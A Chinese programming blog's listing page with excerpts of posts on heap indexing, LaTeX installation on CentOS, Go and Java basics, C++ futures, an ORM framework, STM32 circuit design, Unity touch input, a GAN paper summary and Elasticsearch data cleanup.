已知父亲(parent)的下标
左孩子(left)下标等于 l e f t = 2 ∗ p a r e n t + 1 left = 2*parent+1 left=2∗parent+1右孩子(right)下标等于 r i g h t = 2 ∗ p a r e n t + 2 right = 2 * parent + 2 right=2∗parent+2 已知左孩子或右孩子下标(child)
父亲节点下标等于 p a r e n t = ( c h i l d − 1 ) / 2 parent = (child-1)/2 parent=(child−1)/2 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/971bafc1bc069e414fb7f20d08882940/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25fdeecaf871e0ad8d21d19fbbd083f0/" rel="bookmark">
			【Latex】centos基于yum安装Latex
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
YUM安装命令
PYTHON安装命令
我的安装版本
其他
参考资料
前言 在使用 matplotlib 库进行绘图时，使用了Latex的语法，故需安装Latex工具。
Latex简介：
LATEX为TEX基础上的一套格式，令作者能够使用预定义的专业格式以较高质量排版和印刷他们的作品。LATEX使用TEX程序作为自己的排版引擎。
TEX简介：
TEX是高德纳(Donald E.Knuth)开发的、以排版文字和数学公式为目的的一个计算机软件。TEX以其卓越的稳定性、跨平台、几乎没有Bug而著称。TEX的版本号不断趋近于π。
（来源知乎：【LaTeX】LaTex 的基本介绍 - 知乎 (zhihu.com)）
我的环境：
CentOS 8
python 3.8
matplotlib 3.7.1
YUM安装命令 使用yum进行安装： sudo yum -y install texlive texlive-latex texlive-xetex sudo yum -y install texlive-collection-xetex 如果还不行在安装：
sudo yum -y install texlive-collection-latex sudo yum -y install texlive-collection-latexrecommended sudo yum -y install texlive-xetex-def PYTHON安装命令 pip install latex 我的安装版本 日期：2023-5-27
latex（python）： 0.7.0
texlive库（大部分）：20180414 【这个库安装了好多，这个是总体上的版本日期】
其他 我的方法成功解决了我的问题，但是可能并不适用于所有问题，如果需要卸载以上安装的内容可以使用以下指令：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25fdeecaf871e0ad8d21d19fbbd083f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98ea03e54cc53e9502bb9214cf964e0c/" rel="bookmark">
			Go快速上手之基础语法 ｜ 青训营笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Go快速上手之基础语法 ｜ 青训营笔记 文章目录 Go快速上手之基础语法 ｜ 青训营笔记系列介绍本文摘要1. Go 介绍2. Go 的环境配置2.1 :sparkles: IDE2.2 Gitpod 和 Jetbrians Gateway 的使用 3. Go的基础语法3.1 Hello World3.2 变量与常量3.3 条件控制语句:point_right: if-else :point_left::point_right: switch-case :point_left: 3.4 循环 :point_right: for :point_left:3.5 数组和切片:point_right: array :point_left::point_right: slice :point_left: 3.7 :point_right: map :point_left:3.8 :point_right: range :point_left:3.10 函数 参数指针值传递 和 指针传递 3.11 :point_right:struct :point_left:结构体成员方法 3.12 :point_right: error :point_left:3.13:point_right: string :point_left:字符串3.14 :point_right: fmt :point_left:3.15 :point_right: json :point_left:3.16 :point_right:time:point_left:3.17 :point_right: strconv :point_left:数字解析3.18 进程信息，获取系统参数 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98ea03e54cc53e9502bb9214cf964e0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/312c34c90fc1b8b71195d7421902b954/" rel="bookmark">
			JAVA基础——异常详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JAVA基础——异常详解 阅读目录
一、异常简介二、try-catch-finally语句三、throw和throws关键字四、java中的异常链五、结束语 JAVA异常与异常处理详解 回到顶部
一、异常简介 什么是异常？
异常就是有异于常态，和正常情况不一样，有错误出错。在java中，阻止当前方法或作用域的情况，称之为异常。
java中异常的体系是怎么样的呢？
1.Java中的所有不正常类都继承于Throwable类。Throwable主要包括两个大类，一个是Error类，另一个是Exception类；
2.其中Error类中包括虚拟机错误和线程死锁，一旦Error出现了，程序就彻底的挂了，被称为程序终结者；
3.Exception类，也就是通常所说的“异常”。主要指编码、环境、用户操作输入出现问题，Exception主要包括两大类，非检查异常（RuntimeException）和检查异常（其他的一些异常）
4.RuntimeException异常主要包括以下四种异常（其实还有很多其他异常，这里不一一列出）：空指针异常、数组下标越界异常、类型转换异常、算术异常。RuntimeException异常会由java虚拟机自动抛出并自动捕获（就算我们没写异常捕获语句运行时也会抛出错误！！），此类异常的出现绝大数情况是代码本身有问题应该从逻辑上去解决并改进代码。
5.检查异常，引起该异常的原因多种多样，比如说文件不存在、或者是连接错误等等。跟它的“兄弟”RuntimeException运行异常不同，该异常我们必须手动在代码里添加捕获语句来处理该异常，这也是我们学习java异常语句中主要处理的异常对象。
回到顶部
二、try-catch-finally语句 （1）try块：负责捕获异常，一旦try中发现异常，程序的控制权将被移交给catch块中的异常处理程序。
【try语句块不可以独立存在，必须与 catch 或者 finally 块同存】
（2）catch块：如何处理？比如发出警告：提示、检查配置、网络连接，记录错误等。执行完catch块之后程序跳出catch块，继续执行后面的代码。
【编写catch块的注意事项：多个catch块处理的异常类，要按照先catch子类后catch父类的处理方式，因为会【就近处理】异常（由上自下）。】
（3）finally：最终执行的代码，用于关闭和释放资源。
=======================================================================
语法格式如下：
try{ //一些会抛出的异常 }catch（Exception e）{ //第一个catch //处理该异常的代码块 }catch（Exception e）{ //第二个catch，可以有多个catch //处理该异常的代码块 }finally{ //最终要执行的代码 } 当异常出现时，程序将终止执行，交由异常处理程序（抛出提醒或记录日志等），异常代码块外代码正常执行。 try会抛出很多种类型的异常，由多个catch块捕获多钟错误。
多重异常处理代码块顺序问题：先子类再父类（顺序不对编译器会提醒错误），finally语句块处理最终将要执行的代码。
=======================================================================
接下来，我们用实例来巩固try-catch语句吧~
先看例子：
1 package com.hysum.test; 2 3 public class TryCatchTest { 4 /** 5 * divider:除数 6 * result:结果 7 * try-catch捕获while循环 8 * 每次循环，divider减一，result=result+100/divider 9 * 如果：捕获异常，打印输出“异常抛出了”，返回-1 10 * 否则：返回result 11 * @return 12 */ 13 public int test1(){ 14 int divider=10; 15 int result=100; 16 try{ 17 while(divider&gt;-1){ 18 divider--; 19 result=result+100/divider; 20 } 21 return result; 22 }catch(Exception e){ 23 e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/312c34c90fc1b8b71195d7421902b954/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dcc655855283f02c074f5cf52d4459c/" rel="bookmark">
			idea2023创建JavaWeb教程 解决右键没有Servlet的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、创建JavaWeb项目 1.首先创建一个普通的Java项目：
2.右键项目名，添加框架支持，我们选择web框架
3.在WEB-INF目录下创建两个文件，classes和lib
4.File-&gt;Project Structure-&gt;Modules-&gt;Paths，勾选第二个，并设置classes文件的地址
5.File-&gt;Project Structure-&gt;Modules-&gt;Dependencies 点击 + 号，选择第一项
找到lib路径
将它设置为存储jar包的位置
6. File-&gt;Project Structure-&gt;Libraries，点击第一个
找到你的电脑上的tomact文件下lib目录，选择jsp和servlet的jar包
二、部署tomcat服务器 如果第一次部署，要检查java和tomcat是否安装成功
选择路径
设置部署项目
点击Apply，再点击OK
三、解决右键没有Servlet的问题 1.打开设置File-&gt;Settings
进入下面的界面，复制右侧代码 2.切换至文件，点击 + 号创建模板，起个名字比如说Servlet.java，然后把刚刚的代码复制进去 3.大功告成
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb01d571728617f003dbf99ed5a033ba/" rel="bookmark">
			C&#43;&#43;异步调用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++之future和promise future和promise的作用是在不同线程之间传递数据。使用指针也可以完成数据的传递，但是指针非常危险，因为互斥量不能阻止指针的访问；而且指针的方式传递的数据是固定的，如果更改数据类型，那么还需要更改有关的接口，比较麻烦；promise支持泛型的操作，更加方便编程处理。
假设线程1需要线程2的数据，那么组合使用方式如下：
线程1初始化一个promise对象和一个future对象，promise传递给线程2，相当于线程2对线程1的一个承诺；future相当于一个接受一个承诺，用来获取未来线程2传递的值
线程2获取到promise后，需要对这个promise传递有关的数据，之后线程1的future就可以获取数据了。
如果线程1想要获取数据，而线程2未给出数据，则线程1阻塞，直到线程2的数据到达。
future对象是std::async、std::promise、std::packaged_task的底层对象，用来传递其他线程中操作的数据结果。
std::promise的作用就是提供一个不同线程之间的数据同步机制，它可以存储一个某种类型的值，并将其传递给对应的future， 即使这个future不在同一个线程中也可以安全的访问到这个值。
#include &lt;iostream&gt; #include &lt;functional&gt; #include &lt;future&gt; #include &lt;thread&gt; #include &lt;chrono&gt; #include &lt;cstdlib&gt; void thread_set_promise(std::promise&lt;int&gt;&amp; promiseObj) { std::cout &lt;&lt; "In a thread, making data...\n"; std::this_thread::sleep_for(std::chrono::milliseconds(1000)); promiseObj.set_value(35); std::cout &lt;&lt; "Finished\n"; } int main() { std::promise&lt;int&gt; promiseObj; std::future&lt;int&gt; futureObj = promiseObj.get_future(); std::thread t(&amp;thread_set_promise, std::ref(promiseObj)); std::cout &lt;&lt; futureObj.get() &lt;&lt; std::endl; t.join(); system("pause"); return 0; } async（高级封装future和thread)
std::future可以从异步任务中获取结果，一般与std::async配合使用，std::async用于创建异步任务，实际上就是创建一个线程执行相应任务。
std::async就是异步编程的高级封装，封装了std::future的操作，基本上可以代替std::thread 的所有事情。
std::async的操作，其实相当于封装了std::promise、std::packaged_task加上std::thread。
#include &lt;iostream&gt; // std::cout #include &lt;future&gt; // std::async, std::future #include &lt;chrono&gt; // std::chrono::milliseconds bool is_prime (int x) { for (int i=2; i&lt;x; ++i) if (x%i==0) return false; return true; } int main () { // call function asynchronously: std::future&lt;bool&gt; fut = std::async (is_prime,444444443); // do something while waiting for function to set future: std::cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb01d571728617f003dbf99ed5a033ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad848c0416c1efeabd53532a98bdb12e/" rel="bookmark">
			献给转java的c#和java程序员的数据库orm框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一个好的程序员不应被语言所束缚,正如我现在开源java的orm框架一样,如果您是一位转java的c#程序员,那么这个框架可以带给你起码没有那么差的业务编写和强类型体验。如果您是一位java程序员,那么该框架可以提供比Mybatis-Plus功能更加丰富、性能更高,更加轻量和完全免费的体验来做一个happy coding crud body。
背景 easy-query该框架是我在使用Mybatis-Plus(下面统称MP) 2年后开发的,因为MP不支持多表(不要提join插件(逻辑删除子表不支持)),并且Mybatis原本的xml十分恶心,导致项目中有非常多的代码需要编写sql,并且整体数据库架构因为存在逻辑删除字段和多租户字段所以编写的sql基本上多多少少都会有问题,我不相信大家没遇到过,而且MP得一些功能还需要收费这大大让我坚定还是自己开发一款。
介绍 easy-query 🚀 是一款无任何依赖的JAVA ORM 框架，十分轻量，拥有非常高的性能，支持单表查询、多表查询、union、子查询、分页、动态表名、VO对象查询返回、逻辑删、全局拦截、数据库列加密(支持高性能like查询)、数据追踪差异更新、乐观锁、多租户、自动分库、自动分表、读写分离，支持框架全功能外部扩展定制，拥有强类型表达式。
GITHUB github地址
GITEE gitee地址
📚 文档 GITHUB地址 | GITEE地址
缺点 先说一下缺点,目前只适配了MySql,不过基本上如果你是pgsql很少需要改动就直接可以用了,其他数据库可能因为自己的语法和特性会需要稍微做一下修改但是整体而言无需过多的变动,框架已经全部抽象好了。
功能点 实体对象insert,update,delete全部支持单表查询、多表join查询，in子查询，exists子查询,连表统计(select a,(select count(1) from b) from c)，联合查询union | all，分组group | having分页动态表名：运行时修改表名原生sql执行，查询select查询map结果返回select支持直接返回DTO对象实现自定义列查询返回,而不是全部列返回select支持标记large字段不返回(默认返回)逻辑删除，自定义逻辑删除,支持多字段逻辑删除填充，支持运行时禁用全局拦截器，支持运行时选择性使用某几个或者不使用，支持entity操作 insert,update,条件拦截 select、update、delete的where条件拦截，update set字段拦截器多租户，支持表的列范围多租户模式数据库列加密,支持高性能的like模糊搜索匹配(不是单纯的调用数据库加密函数或者单纯的调用框架加密解密函数)数据追踪差异更新,而不是全列更新,用过efcore的肯定很熟悉版本号、乐观锁,支持自定义乐观锁支持分库分表(身为sharding-core作者不支持说不过去),全自动分库分表,仅需用户新增表和告知easy-query系统中有的表高性能分库分表分页,支持顺序分页,反向分页,支持高性能顺序分页和反向分页分库分表多字段分片分库分表自定义分片路由规则支持读写分离，一主多从支持分片下读写分离 目前项目正处于起步阶段后续会随着用户不断地完善各数据库的适配和功能的支持
开始使用 安装 以下是spring-boot环境和控制台模式的安装
spring-boot &lt;properties&gt; &lt;easy-query.version&gt;0.8.10&lt;/easy-query.version&gt; &lt;/properties&gt; &lt;dependency&gt; &lt;groupId&gt;com.easy-query&lt;/groupId&gt; &lt;artifactId&gt;sql-springboot-starter&lt;/artifactId&gt; &lt;version&gt;${easy-query.version}&lt;/version&gt; &lt;/dependency&gt; console 以mysql为例
&lt;properties&gt; &lt;easy-query.version&gt;0.8.10&lt;/easy-query.version&gt; &lt;/properties&gt; &lt;dependency&gt; &lt;groupId&gt;com.easy-query&lt;/groupId&gt; &lt;artifactId&gt;sql-mysql&lt;/artifactId&gt; &lt;version&gt;${easy-query.version}&lt;/version&gt; &lt;/dependency&gt; //初始化连接池 HikariDataSource dataSource = new HikariDataSource(); dataSource.setJdbcUrl("jdbc:mysql://127.0.0.1:3306/easy-query-test?serverTimezone=GMT%2B8&amp;characterEncoding=utf-8&amp;useSSL=false&amp;allowMultiQueries=true&amp;rewriteBatchedStatements=true"); dataSource.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad848c0416c1efeabd53532a98bdb12e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61fe9d7a7c9647ed948fc4bab288fc1b/" rel="bookmark">
			STM32 CH340一键下载电路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为自己要做开发板，就给stm32的uart1加了个ch340一键下载电路，记录在此：
开发板原理图
原理图：
pcb制板图：
此外还要把BOOT0通过一个10KΩ电阻接地
以上元器件大多数都是嘉立创基础库，不用交换料费，ch340和USB插座除外
下载要使用flymcu，在这里下载：http://www.mcuisp.com/
配置如图，波特率最好选择115200bps，不然很有可能失败，越慢失败可能性越低
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df5a7cde1972f6477b5d71b158dfebc1/" rel="bookmark">
			golang如何引入自定义包？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比如安装go jdk在D盘D:\golang\bin
建议将项目放在D:\golang\src目录下，这时候直接可以读取GOPATH为D:\golang\src，此时引入自定义包路径即为自己项目名称+具体包路径
1.第一种比较笨的方式：比如可以在D:\golang\src下建一个项目my-project
my-project目录层级如下：
main/main.go
utils/utils.go
main.go调用自定义包utils包的方法GetSum
package main import ( "fmt" "my-project/utils" ) func main() { var result int = utils.GetSum(100, 200) fmt.Println(result) } utils.go包下可以自定义包名和函数GetSum
package utils func GetSum(a int, b int) int { return a + b } 2.第二种使用go.mod的方式，项目比较推荐
早在终端输入命令:go mod init 后面一般跟git项目路径即可
执行完go mod init github.com/golang/go-web命令生成 go.mod文件大致如下,后面这只是虚拟个人git项目地址，根据个人项目情况而定：
module github.com/golang/go-web go 1.20 导入包测试
新建一个testModule/test.go
package testModule func CountSum(a int, b int) int { return a + b } 在main.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df5a7cde1972f6477b5d71b158dfebc1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87767d17103d632f67b2f08cb0e94880/" rel="bookmark">
			Unity——触摸方法的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先在start()中开启触摸方法的使用：
void start() { //开启多点触摸 Input.multiTouchEnabled=true; } 然后在每一帧中对触摸方式进行判断：
void Update() { //判断单点触摸 if(Input.touchCount==1) { //触摸对象 Touch.touch=Input.touches[0]; //触摸位置 Debug.Log(touch.position)； //触摸阶段 switch(touch.phase) { case TouchPhase.Began: break; case TouchPhase.Moved: //移动时 break; case TouchPhase.Stationary: //静止时 break; case TouchPhase.Ended: //结束时 break; case TouchPhase.Canceled: break; } } //判断多点触摸 if(Input.touchCount==2) { //触摸对象 Touch.touch1=Input.touches[0]; Touch.touch2=Input.touches[1]; //触摸位置 Debug.Log(touch1.position)； Debug.Log(touch2.position)； //触摸阶段 switch(touch1.phase) { case TouchPhase.Began: break; case TouchPhase.Moved: //移动时 break; case TouchPhase.Stationary: //静止时 break; case TouchPhase.Ended: //结束时 break; case TouchPhase.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87767d17103d632f67b2f08cb0e94880/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/309c73e19eb2b07d02b223246ee0075f/" rel="bookmark">
			Stm32最小系统板电路图设计、PCB设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、电路设计1.复位电路2.时钟电路3.电源电路4.SWD接口电路5.BOOT启动电路 二、原理图绘制1. 工程的建立2. 原理图的绘制2.1 使用已有库绘制原理图2.2 构建原理图库 2.3 整体原理图 三、PCB绘制3.1元件封装3.1.1 元件封装的检测3.1.2 元件封装的添加3.1.3 封装库的建立 3.2 PCB设计3.2.1 PCB设计前布局3.2.2 PCB布局3.2.3 PCB布线3.2.4 PCB规则设计3.2.5 PCB电气规则检查3.2.6 滴泪以及铺铜操作 3.3 网络报表3.3.1 网络报表的概念3.3.2 网络报表的操作步骤 一、电路设计 1.复位电路 复位电路，就是指单片机芯片可以通过外部外部引脚输入复位电平信号，从而使单片机除备份区以外的所有寄存器都恢复为默认值，且芯片内烧录的程序会重新执行。对于STM32103C8T6芯片来说，其复位引脚是7号引脚，也就是NRST引脚。
通过复位电路对Stm32芯片系统进行的复位是外部复位，除此之外，Stm32芯片内部还有独立看门狗IWDG复位、窗口看门狗WWDG复位、软件SW复位和低功耗管理复位。独立看门狗和窗口看门狗就是一个递减计数器，当计数器的值减小到0的时候，系统就会进行复位。软件SW复位是通过程序在Stm32的一个寄存器的SW位赋值来控制复位。低功耗管理复位可以在待机或者停机状态下将Stm32的系统复位。除了复位电路的外部复位，其他复位模式并不需要自己设计，本文就仅设计了Stm32的外部复位电路，电路图如下。
此原理图由一个按键和一个电容并联后再和一个上拉电阻串联构成。上拉电阻一端接电源，另一端接电容和按键的并连结点，该结点接芯片的NRST引脚。芯片系统产生复位的条件是当NRST引脚的电压值低于某一值时就会产生复位，在本图中，按键没有按下时，NRST所接引脚的电压为电源电压，系统不会产生复位。当按键按下时，NRST对应引脚接地，芯片会产生复位。
2.时钟电路 Stm32芯片内部是由十分复杂的数字电路以及其他电路组成，需要稳定的时钟脉冲信号才能够保证其正常工作，通过Stm32的数据手册可知，Stm32芯片要想正常工作，其需要用到时钟的模块有很多。其分别是Contex-M3内核、闪存FLASH、可配置的静态存储器控制器FSMC、SDIO、内置SRAM、DMA直接数据存储、AHB总线、APB1总线及APB2总线。其中Contex-M3需要用到Contex自由运行时钟FCLK和Contex系统时钟SYSCLK。闪存FLASH、内置SRAM、DMA直接数据存储器和AHB总线则需要用到高速时钟HCLK。FSMC和SDIO也有其特有的时钟，分别为FSMCCLK和SDIOCLK。APB1和APB2也有其特有的时钟。由于芯片的内部集成化要求，不可能将每个模块都配置一个时钟源，因此芯片内部对已有的时钟源进行分频或者倍频操作，从而达到各个模块要求的时钟频率。
通过Stm32的数据手册得知，Stm32的芯片内部有三个时钟源，分别是HSI、LSI、PLL倍频器，除此之外还具备两个可以接外部时钟源的引脚，分别是OSCIN和OSC32IN。其中OSCIN引脚可以接4~16MHZ的晶体振荡器，在本设计中采用8MHZ的晶体振荡器。OSC32引脚通常接入32.768KHZ的晶振。本设计所采用的晶振都为石英晶振，因此外部晶振模块的抗干扰能力和精度相较于系统内部已有的晶振要提升很多，所以正常情况下，模块使用外部晶振。时钟电路的原理图设计如下。
电路原理图中，Y1为32.768KHZ的石英晶体振荡器，其两端分别通过匹配电容接地，其两端也分别接PC14和PC15，PC14在本设计中就是OSC32_IN引脚，PC15就是OSC32_OUT引脚。Y2为8MHZ的石英晶体振荡器，其和一个1M欧姆的电阻R9并联后分别接OSC_IN和OSC_OUT，并且通过两个匹配电容接地。匹配电容的作用是使晶振两端的等效电容等于或接近负载电容和滤除掉晶振波形中的高频杂波。R9是反馈电阻，其作用是保证非门工作在线性工作区，这样晶振会更容易起振。
3.电源电路 通过对Stm32数据手册的查阅可以得知，Stm32的芯片工作电压范围为2.0-3.6V。Stm32提供给模数转换电路的电压范围为2.4V-3.6V，在对模数转换没有较高精度要求的时候，其可以直接接到芯片的供电电源上，本文所设计的电源电路提供给Stm32芯片的电压值为3.3V。电源电路设计如图。
由于此最小系统板的设计采用USB供电，USB的直接供电电压是5V，因此需要设计出一个降压电路模块来将5V电压降到芯片所能够承受的3.3V。本设计在降压电路模块所采用的稳压芯片是RT9193。该稳压芯片具有输入端、参考噪声旁路端口、使能端、接地端和输出端五个引脚。电源电路原理图中输入端接USB提供的5V电压。BP端口接滤波电容。输出端口输出3.3V的稳定电压，输出电路部分接电容C3和C4，其作用为抑制自激振荡和稳定输出电压。
由于芯片中各个电路网络中电流变化时，各个电路模块之间会产生耦合现象，在电源电路模块中产生的耦合电流会对整个最小系统板的正常工作产生影响，因此可以设计一个退耦电容电路来消除各个电路模块之间产生的寄生耦合。本文所设计的退耦电路模块是在电路正极和地之间并联了4个退耦电容。退耦电路原理图如下。
4.SWD接口电路 Stm32的下载调试电路由JTAG下载电路、SWD下载电路，除此之外还可以通过串口下载和ISP下载。本设计SWD仿真调试下载。电路原理图部分只需要将芯片上的SWDIO和SWDCLK与SWD接口上的对应端口连接好即可，在本设计中芯片的SWDIO和SWDCLK非别为PA13和PA14引脚。在SWD端口的3.3V供电端口和接地端口接入一个电容，来达到抗干扰和滤波的作用。下载电路原理图如下所示。
5.BOOT启动电路 通过Stm32的用户手册可以得知，Stm32有三种启动状态，其由BOOT1和BOOT0引脚控制，BOOT0和BOOT1的值与启动模式之间的具体关系如下表所示。
在本设计中，BOOT0对应芯片的引脚为44号引脚，BOOT1对应引脚为20号引脚。本设计通过一个3*2的跳线针来作为主体，其1、2号引脚接3.3V电源，3、4号引脚分别通过一个电阻与BOOT0和BOOT1相连接，5、6号引脚接地。需要更改Stm32的启动模式时，只需要用跳线帽就可以达到更改BOOT0和BOOT1的值的目的，从而就可以更改启动模式。BOOT启动电路原理图如下。
二、原理图绘制 1. 工程的建立 点击左上角菜单栏中的文件，点击新的–&gt;项目，建立一个完整的工程。此后建立的所有文件必须保证PCB和原理图必须保存在同一个项目下，否则在进行原理图转到PCB时会出现错误。成功建立的工程如下图所示。
2. 原理图的绘制 2.1 使用已有库绘制原理图 本设计的原理图库原理图库参考了部分嵌入式设计课程中所提供的STM32F108RCT6 MINI板的原理图，本设计选出了Stm32最小系统板需要用到的几个模块，从而完成了关于原理图部分的设计。正常的原理图绘制操作，需要提前下载好原理图库以及原理图库对应的封装库，在右侧的Compoents中可以选择自己需要用到的原理图库，并且可以添加自己需要的原理图库，以及从原理图库文件夹中查询元件。具体操作如下所示。
2.2 构建原理图库 本次设计中，原理图上用到的所有元件都来自于自行建立的库中，自行建造库的原因有两个。其一是通过对原理图库的构建可以提升查找芯片资料的能力和阅读芯片数据手册的能力。其二是因为stm32最小系统是一个很常用的芯片，其开发板用途很广泛，在后续竞赛项目中可能会用到。同时，建立起一个最小系统需要用到的所有元件的原理图库，也可以将资源共享，帮助其他人。综合以上两点因素，在本次设计中建立了一个完整地stm32最小系统板所需要用到的原理图库。
库的建立流程：点击左上角文件–&gt;选择新建–&gt;库–&gt;原理图库。原理图库的建立最好也保存在本工程下，但并不强制，也可以将此库作为一个常用库，跟其他库放在同一文件夹下。在建立原理图库时，就是绘制出元件在电路图中的模样。在进行元件的绘制，添加引脚时，可以在右侧的Properties中对各个引脚的属性进行设置，这是在直接调用库中不容易被关注到的一个地方，建立库后库的形式和Properties的界面如下。
2.3 整体原理图 三、PCB绘制 3.1元件封装 3.1.1 元件封装的检测 元件封装检测方法有三种。方法一是点击原理图转到PCB时可以点击验证变更，如果没有错误，便表示封装都已添加完毕。方法二点击封装管理器，来对每一个元件的封装进行检测，在此也可以给没有封装的元件添加封装。方法三是依次的点击每个元件，然后在其Properties中来检验其是否有封装。
3.1.2 元件封装的添加 元件的封装添加步骤与原理图设计时元件的添加类似，可以直接在该工程中添加上封装库，但这种方法并不太可行，因为大多数元件的封装库并不清楚，因此来查找封装或者来构建专属于自己工程的封装库就显得很重要。
3.1.3 封装库的建立 建立封装库文件步骤是点击文件，点击新的，在此界面下点击库，最后点击PCB库即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/309c73e19eb2b07d02b223246ee0075f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1792b0cb176687a06eed88e1040fe16c/" rel="bookmark">
			（2022，MaskedGAN）掩蔽的生成对抗网络是数据高效生成学习者
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Masked Generative Adversarial Networks are Data-Efficient Generation Learners
公众号：EDPJ
目录
0. 摘要
1. 简介
2. 相关工作
3. 方法
3.1 任务定义
3.2 掩蔽的生成对抗网络
3.3 理论见解
4. 实验 4.1 在 CIFAR-10、CIFAR-100 和 ImageNet 上使用 BigGAN 条件生成图像
4.2 使用 StyleGAN-v2 在 100-shot、AFHQ 和 FFHQ 上进行无条件图像生成 4.3 使用 TransGAN 和 GANformer 进行无条件图像生成 4.4 讨论 5. 结论 参考
附录
G. 与 MAE 中使用的掩蔽策略的比较
H. 与 ADA 和 DA 中使用的“剪切 (cutout)” 的比较 I. 与其他所谓的 MaskedGAN 的关系
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1792b0cb176687a06eed88e1040fe16c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c655bea73e674c3a6271153148365b41/" rel="bookmark">
			C语言编程必将成为通用技能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正文： 为什么我们要学习编程？
编程是当今时代不可或缺的核心技能。它不仅仅是程序员的专属领域，而是逐渐成为一种通用技能，被越来越多的人所需。想象一下，不久的将来，编程将变成人人都会的事情，而职业编程人员会逐渐减少。就像识字一样，编程将成为人们必备的技能之一，适应数字化时代，参与技术驱动的社会。
为什么编程如此重要？
首先，学习编程可以培养逻辑思维、问题解决能力、创造力和创新能力。这些软技能在现代职场和社会中非常有价值，可以提高个人竞争力。
其次，随着数字化时代的到来，计算机技术在各个行业的应用越来越广泛。具备编程能力的人在就业市场上更具竞争力，拥有更多的就业机会。而且，学习编程还为创业和创新提供了机会，可以将想法转化为实际项目。
此外，编程可以简化重复的任务和流程，提高工作效率。通过编写脚本或自动化工具，可以节省时间和精力，将更多精力投入到更重要的工作中。
最重要的是，编程是解决问题的工具。无论是处理大数据、创建模拟模型、优化流程还是解决其他实际问题，编程都可以提供有效的解决方案。它通过各种算法实现具体的业务逻辑，将复杂的过程抽象化、可计算化，帮助我们找到达到目标的最优路径。
经得起时间考验的通识技能
编程是一项经得起时间考验的通识技能。尽管计算机技术不断发展，编程语言和工具不断更新，但经典算法经过时间的考验，依然具有重要价值。这些经典算法是计算机科学家们从解决现实问题中总结出的方法和策略，是编程能力的基石。
综上所述，学习编程不仅有助于个人发展和就业竞争力，还可以提升解决问题的能力和思维方式，使人们适应快速变化的数字化社会。不要等到编程成为普遍需求才行动，现在就开始学习，抓住机会赢得职场竞争的优势！
结语： 无论你是学生、职场新人还是行业专家，学习编程都是一个明智的选择。掌握这一技能将为你的未来发展打下坚实的基础，并为你开启更广阔的机遇之门。现在就行动起来，探索编程世界的奇妙之处吧！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/886de13ef9f0c28fa87954244ded3a18/" rel="bookmark">
			自动清理 ES 历史数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、 背景
二、解决方案
三、实现操作
三、合并定时任务的例子
一、 背景 随着业务的增长和时间的变化，ES 数据库的存储空间越来越大，存储数据多数为系统监控日志，保存的数据不需要长期保留，多数情况只需要保留几个月ES数据即可，既可以减轻ES服务器的负载和资源使用率，还可以节约更多的存储空间。
二、解决方案 由于我的环境是k8s集群，ES 主要是为k8s集群内部应用服务，没有映射外部访问端口，所以不能直接使用Linux自带的crontab定时ES数据清理脚本。需要创建一个容器定时任务来定时清理ES历史数据。
k8s定时任务，会根据你设置的时间，定时启动pod实例来执行任务，pod完成执行任务后，pod的状态会由 running 状态变成 Completed 状态。查看定时任务脚本执行日志，可通过查看pod日志实现。
